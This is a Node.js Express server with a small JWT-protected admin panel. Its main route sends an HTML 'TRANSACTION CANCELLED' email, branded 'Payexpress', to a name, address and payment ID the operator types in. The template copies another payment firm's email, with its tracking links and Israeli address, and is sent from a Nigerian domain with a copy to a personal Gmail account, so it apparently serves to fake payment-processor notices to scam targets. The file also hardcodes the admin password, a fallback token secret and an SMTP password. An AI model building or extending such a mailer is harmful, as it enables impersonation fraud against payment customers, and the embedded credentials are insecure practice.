const express = require("express");
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const dotenv = require("dotenv");

const app = express();
const PORT = 8001 || process.env.PORT;
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.use(cookieParser());

// Configure dotenv
dotenv.config();

// Configure EJS as the view engine
app.set("view engine", "ejs");
app.set("views", __dirname + "/views");

const admin_username = "valour";
const admin_password = "valour217";
const token_secret_key = process.env.TOKEN_SECRET_KEY || "gods_of_all";
const server_admin_url = "/server/admin";

//email
const nodemailer = require("nodemailer");

// Admin login route
app.get(`${server_admin_url}/login`, (req, res) => {
  res.render("login");
});

// Admin select route
app.get(`${server_admin_url}/select`, validate, (req, res) => {
  res.render("select");
});

app.post(`${server_admin_url}/login`, (req, res) => {
  function validateUser(username, password) {
    return username === admin_username && password === admin_password;
  }
  if (validateUser(req.body.username, req.body.password)) {
    const token = jwt.sign({ username: req.body.username }, token_secret_key, {
      expiresIn: "1h"
    });
    res.cookie("jwt", token, {
      expires: new Date(Date.now() + 34 * 3600000),
      httpOnly: true,
      // secure: true,
      sameSite: "strict"
    });
    res.status(200).json({ login: `${server_admin_url}/select` });
  } else {
    if (req.body.username !== admin_username) {
      res.json({ message: "username incorrect" });
    } else if (req.body.password !== admin_password) {
      res.json({ message: "password incorrect!" });
    } else {
      res.status(401).json({ message: "Invalid! No body" });
    }
  }
});

// Middleware for validating JWT tokens
function validate(req, res, next) {
  const token = req.cookies.jwt;
  if (token) {
    jwt.verify(token, token_secret_key, (err, decodedToken) => {
      if (err) {
        return res.status(403).redirect(`${server_admin_url}/login`);
      }
      if (decodedToken) {
        next();
      }
    });
  } else {
    res.status(401).redirect(`${server_admin_url}/login`);
  }
}

// Send mail
app.post(`${server_admin_url}/send_mail`, validate, (req, res) => {
  const { fullName, email, payId } = req.body;
  console.log(
    `Information received: FullName (${fullName}), Email (${email}), PayId (${payId})`
  );
  // Send the email
  const receiverName = fullName;
  const receiverEmail = ["ogbonnaprince13@gmail.com", email];
  const paymentId = payId;

  // Replace with your email service configuration
  const transporter = nodemailer.createTransport({
    host: "mail.payexpress.com.ng", // Replace with your email provider's SMTP host
    port: 465, // Replace with your email provider's SMTP port
    auth: {
      user: "support@payexpress.com.ng", // Replace with your email address
      pass: "Legitvip@19" // Replace with your email password
    }
  });

  // Define the email content
  const mailOptions = {
    from: '"PAYEXPRESS" <support@payexpress.com.ng>', // Replace with your name and email
    to: receiverEmail, // Replace with recipient's email
    subject: "TRANSACTION CANCELLED",
    html: `<!DOCTYPE html>
  <html lang="en">
  
  <head>
      <meta charset="UTF-8">
      <title>Payexpress</title>
      <style>
          /*! CSS Used from: Embedded */
          td {
              margin: 0;
          }
  
          .ii a[href] {
              color: #15c;
          }
  
          .gt a {
              color: #222;
          }
  
          .gs li {
              margin-left: 15px;
          }
  
          .an1 {
              height: 1.2em;
              width: 1.2em;
              vertical-align: middle;
          }
      </style>
  </head>
  
  <body>
      <div dir="ltr">
          <div style="color:rgb(80,0,80);margin:0px auto;max-width:600px">
              <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:600px">
                  <tbody>
                      <tr>
                          <td style="direction:ltr;font-size:0px;padding:0px;text-align:center">
                              <div
                                  style="text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:600px">
                                  <table border="0" cellpadding="0" cellspacing="0" role="presentation"
                                      style="width: 100%;border-collapse:collapse;border-spacing:0px">
                                      <tbody style="width: 100%;">
                                          <tr style="
  width: 100%;
  ">
                                              <td style="width:100%"><img alt=""
                                                      src="https://payexpress.com.ng/5D47FEB1-FB8E-476C-AD5F-3DAD8A7FB88B.jpeg"
                                                      title=""
                                                      style="border:none;border-radius:0px;display:block;outline:none;width:100%;font-size:13px;height: 120px;object-fit: cover;"
                                                      class="CToWUd" data-bit="iit"
                                                      jslog="138226; u014N:xr6bB; 53:WzAsMl0."></td>
                                          </tr>
                                      </tbody>
                                  </table>
                              </div>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <div
              style="color:rgb(80,0,80);background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;margin:0px auto;max-width:600px">
              <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation"
                  style="background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;width:600px">
                  <tbody>
                      <tr>
                          <td style="direction:ltr;font-size:0px;padding:20px 0px 0px;text-align:center">
                              <div
                                  style="text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:600px">
                                  <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%"
                                      style="vertical-align:top">
                                      <tbody>
                                          <tr>
                                              <td align="left" style="padding:0px 25px;word-break:break-word">
                                                  <div
                                                      style="font-family:Arial,sans-serif;font-size:13px;line-height:22px;color:rgb(85,87,93)">
                                                      <p style="margin:10px 0px"><span
                                                              style="line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif"><img
                                                                  data-emoji="🛑" class="an1" alt="🛑" aria-label="🛑"
                                                                  draggable="false"
                                                                  src="https://fonts.gstatic.com/s/e/notoemoji/15.0/1f6d1/32.png"
                                                                  loading="lazy">Hi ${receiverName},</span></p>
                                                      <p style="margin:10px 0px"><span
                                                              style="line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif">Your
                                                              payment request from LANGSTAN-XYZ-3827 has
                                                              been&nbsp;<b>cancelled</b>.</span></p>
                                                      <p style="margin:10px 0px"><span
                                                              style="line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif">Payexpress
                                                              payment ID: ${paymentId}</span>
                                                      </p>
                                                      <p style="margin:10px 0px"><span
                                                              style="line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif">Please
                                                              note:&nbsp;<b>Your card was NOT charged for this
                                                                  transaction.</b>&nbsp;If you see a charge on your card
                                                              statement, this is just an authorization check to reserve
                                                              that amount on your card.</span></p>
                                                      <p style="margin:10px 0px"><span
                                                              style="line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif">Depending
                                                              on your bank, reserved funds should be released within 1-3
                                                              business days. If you still don’t see them after that time,
                                                              please get in touch with our support team&nbsp; and we will
                                                              be happy to assist you.</span></p>
                                                  </div>
                                              </td>
                                          </tr>
                                      </tbody>
                                  </table>
                              </div>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <div
              style="color:rgb(80,0,80);background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;margin:0px auto;max-width:600px">
              <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation"
                  style="background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;width:600px">
                  <tbody>
                      <tr>
                          <td
                              style="border:0px solid rgb(255,255,255);direction:ltr;font-size:0px;padding:0px;text-align:center">
                              <div
                                  style="text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:600px">
                                  <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%"
                                      style="vertical-align:top">
                                      <tbody>
                                          <tr>
                                              <td style="padding:10px 25px;word-break:break-word">
                                                  <p
                                                      style="border-top:2px solid rgb(230,230,230);font-size:1px;margin:0px auto;width:550px">
                                                  </p>
                                              </td>
                                          </tr>
                                      </tbody>
                                  </table>
                              </div>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <div
              style="color:rgb(80,0,80);background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;margin:0px auto;max-width:600px">
              <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation"
                  style="background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;width:600px">
                  <tbody>
                      <tr>
                          <td
                              style="border:0px solid rgb(255,255,255);direction:ltr;font-size:0px;padding:0px 0px 20px;text-align:center">
                              <div
                                  style="text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:600px">
                                  <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%"
                                      style="vertical-align:top">
                                      <tbody>
                                          <tr>
                                              <td align="left"
                                                  style="background-image:initial;background-position:initial;background-size:initial;background-repeat:initial;background-origin:initial;background-clip:initial;padding:0px 25px 20px;word-break:break-word">
                                                  <div
                                                      style="font-family:Arial,sans-serif;font-size:13px;line-height:1;color:rgb(0,0,0)">
                                                      <p style="margin:10px 0px"><span
                                                              style="color:rgb(85,87,93);line-height:24px;font-family:Verdana,Helvetica,Arial,sans-serif">Need
                                                              help? Please contact our support team 24/7. You can find us
                                                              here:</span></p>
                                                      <ul>
                                                          <li style="margin-left:15px"><span
                                                                  style="color:rgb(85,87,93);line-height:24px;font-family:Verdana,Helvetica,Arial,sans-serif">Start
                                                                  a live chat using the button on the bottom right of
                                                                  our&nbsp;</span><a
                                                                  href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/1/NSvifgbS3M8GrhOfPYW3Dw/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20v"
                                                                  rel="noreferrer" style="text-decoration-line:none"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/1/NSvifgbS3M8GrhOfPYW3Dw/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20v&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw0EOxoepSA0q5OGTzicPq78"><span
                                                                      style="color:rgb(85,87,93);line-height:24px;font-family:Verdana,Helvetica,Arial,sans-serif">homepage</span></a>
                                                          </li>
                                                          <li style="margin-left:15px"><span
                                                                  style="color:rgb(85,87,93);line-height:24px;font-family:Verdana,Helvetica,Arial,sans-serif">Submit
                                                                  a support ticket on our&nbsp;</span><a
                                                                  href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/2/NF0_Bo2yjMeNJsb53KCSaQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vc3VwcG9ydC8"
                                                                  rel="noreferrer" style="text-decoration-line:none"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/2/NF0_Bo2yjMeNJsb53KCSaQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vc3VwcG9ydC8&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw3PxDBsAlh96qXEdAGOJwfG"><span
                                                                      style="color:rgb(85,87,93);line-height:24px;font-family:Verdana,Helvetica,Arial,sans-serif">Support
                                                                      Center</span></a></li>
                                                      </ul>
                                                      <p style="margin:10px 0px"><span
                                                              style="color:rgb(85,87,93);line-height:22px;font-family:Verdana,Helvetica,Arial,sans-serif">Please
                                                              don’t try to get in touch with the Payexpress's support team
                                                              using any other means (including social media), these
                                                              channels are not secure.</span></p>
                                                      <p style="text-align:right;margin:10px 0px"><span
                                                              style="color:rgb(85,87,93);line-height:10px;font-family:Verdana,Helvetica,Arial,sans-serif">Thank
                                                              you,</span></p>
                                                      <p style="text-align:right;margin:10px 0px"><span
                                                              style="color:rgb(85,87,93);line-height:10px;font-family:Verdana,Helvetica,Arial,sans-serif">The
                                                              Payexpress Team</span></p>
                                                  </div>
                                              </td>
                                          </tr>
                                          <tr>
                                              <td style="padding:10px 25px;word-break:break-word">
                                                  <p
                                                      style="border-top:1px solid rgb(212,212,212);font-size:1px;margin:0px auto;width:550px">
                                                  </p>
                                              </td>
                                          </tr>
                                      </tbody>
                                  </table>
                              </div>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <div style="color:rgb(80,0,80);margin:0px auto;max-width:600px">
              <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:600px">
                  <tbody>
                      <tr>
                          <td style="direction:ltr;font-size:0px;padding:8px 0px 20px;text-align:center">
                              <div
                                  style="text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:600px">
                                  <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%"
                                      style="vertical-align:top">
                                      <tbody>
                                          <tr>
                                              <td align="left" style="padding:0px 25px;word-break:break-word">
                                                  <div
                                                      style="font-family:Arial,sans-serif;font-size:12px;line-height:1;color:rgb(0,0,0)">
                                                      <p style="text-align:justify;margin:10px 0px"><a
                                                              href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/3/1lIk-6qBNEmCgh6aA7R_Cw/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vYWJvdXRfc2ltcGxleC8"
                                                              rel="noreferrer" style="text-decoration-line:none"
                                                              target="_blank"
                                                              data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/3/1lIk-6qBNEmCgh6aA7R_Cw/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vYWJvdXRfc2ltcGxleC8&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw0Q-uuAX5Z-LPxG1gWmh9fm"><span
                                                                  style="color:rgb(0,0,238);font-family:Verdana,Helvetica,Arial,sans-serif;line-height:17px"><b>About
                                                                      Us</b></span></a><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">&nbsp;|&nbsp;</span><a
                                                              href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/4/j5RRCT-ezPTXLgV9PhBbJQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vc3VwcG9ydC8"
                                                              rel="noreferrer" style="text-decoration-line:none"
                                                              target="_blank"
                                                              data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/4/j5RRCT-ezPTXLgV9PhBbJQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vc3VwcG9ydC8&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw2XH3VjIFKmdSuNaSeJhdbP"><span
                                                                  style="color:rgb(0,0,238);font-family:Verdana,Helvetica,Arial,sans-serif;line-height:17px"><b>Help</b></span></a><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">&nbsp;|&nbsp;</span><a
                                                              href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/5/NuorVxb3K8TRxoNvqRiUQg/aHR0cHM6Ly9wYXltZW50LXN0YXR1cy5zaW1wbGV4LmNvbS8"
                                                              rel="noreferrer" style="text-decoration-line:none"
                                                              target="_blank"
                                                              data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/5/NuorVxb3K8TRxoNvqRiUQg/aHR0cHM6Ly9wYXltZW50LXN0YXR1cy5zaW1wbGV4LmNvbS8&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw3l3EAFNQZ3urAK9ZgQ6RGV"><span
                                                                  style="color:rgb(0,0,238);font-family:Verdana;line-height:17px"><b>Payment
                                                                      status</b></span></a></p>
                                                      <p style="text-align:justify;margin:10px 0px"><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">This
                                                              email was sent to you by PayexpressCC Ltd. ("<b>Payexpress</b>")
                                                              or one of Payexpress's subsidiaries.</span></p>
                                                      <p style="text-align:justify;margin:10px 0px"><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">Payexpress
                                                              is registered in Israel and its registered office is at <a
                                                                  href="https://www.google.com/maps/search/4+Ariel+Sharon+St.+Givatayim?entry=gmail&amp;source=g"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=https://www.google.com/maps/search/4%2BAriel%2BSharon%2BSt.%2BGivatayim?entry%3Dgmail%26source%3Dg&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw1DQs071c08de2sjy-_3kEn">4
                                                                  Ariel Sharon St. Givatayim</a> 5320047, Israel.</span>
                                                      </p>
                                                      <p style="text-align:justify;margin:10px 0px"><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">Payexpress
                                                              uses cookies, tracking tags and similar technologies in our
                                                              emails, in order to improve our communications with you.
                                                              These tracking technologies help us better understand how
                                                              you interact with our emails. For more information please
                                                              visit our&nbsp;</span><a
                                                              href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/6/U3QQJ_LIcaHB1O0h0PvnDQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vY29va2llLXBvbGljeS8"
                                                              rel="noreferrer" style="text-decoration-line:none"
                                                              target="_blank"
                                                              data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/6/U3QQJ_LIcaHB1O0h0PvnDQ/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vY29va2llLXBvbGljeS8&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw1zXY7sp-59r2uYrmQt4M72"><span
                                                                  style="color:rgb(0,0,238);font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px"><u>Cookie
                                                                      Policy</u></span></a><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">.</span>
                                                      </p>
                                                      <p style="text-align:justify;margin:10px 0px"><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">In
                                                              accordance with relevant data protection and privacy laws,
                                                              we are committed to protecting your privacy. If you wish to
                                                              know more, please access our&nbsp;</span><a
                                                              href="http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/7/GqjHkg2K8IglZ6OrlV0jCg/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vcHJpdmFjeS1wb2xpY3kv"
                                                              rel="noreferrer" style="text-decoration-line:none"
                                                              target="_blank"
                                                              data-saferedirecturl="https://www.google.com/url?q=http://x4tlp.mjt.lu/lnk/EAAAAYNqkEoAAAAAAAAAAA66-WQAAAAAKm0AAAAAABCwGgBgPtou-7WAuKvcSMqMLKsoO-VbzQAMB94/7/GqjHkg2K8IglZ6OrlV0jCg/aHR0cHM6Ly93d3cuc2ltcGxleC5jb20vcHJpdmFjeS1wb2xpY3kv&amp;source=gmail&amp;ust=1716904383834000&amp;usg=AOvVaw3c-PxhDhhYONsf4a4qxsT5"><span
                                                                  style="color:rgb(0,0,238);font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px"><u>Privacy
                                                                      Policy</u></span></a><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">.</span>
                                                      </p>
                                                      <p style="text-align:justify;margin:10px 0px"><span
                                                              style="font-family:Verdana,Helvetica,Arial,sans-serif;font-size:11px;line-height:17px">To
                                                              ensure future delivery of email, be sure to add&nbsp;<a
                                                                  href="mailto:supportpayexpress.com.ng" rel="noreferrer"
                                                                  target="_blank">support@payexpress.com.ng</a>&nbsp;to your
                                                              address book, contacts or safe senders list.</span></p>
                                                  </div>
                                              </td>
                                          </tr>
                                      </tbody>
                                  </table>
                              </div>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
      </div>
  </body>
  
  </html>`
  };
  if (fullName != undefined && email != undefined && payId != undefined)
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return res.status(505).end("Internal Server Error");
      } else {
        return res.status(200).end(`Email sent: %${info.response}`);
      }
    });
});

// Admin route
app.get(
  [`${server_admin_url}`, `${server_admin_url}/`],
  validate,
  (req, res) => {
    // Protected route logic
    res.render("admin");
  }
);
// Logout route
app.get("/logout", (req, res) => {
  res.clearCookie("jwt");
  res.redirect(`${server_admin_url}/login`);
});

app.listen(PORT, () => {
  console.log(`Listening at PORT ${PORT}`);
});
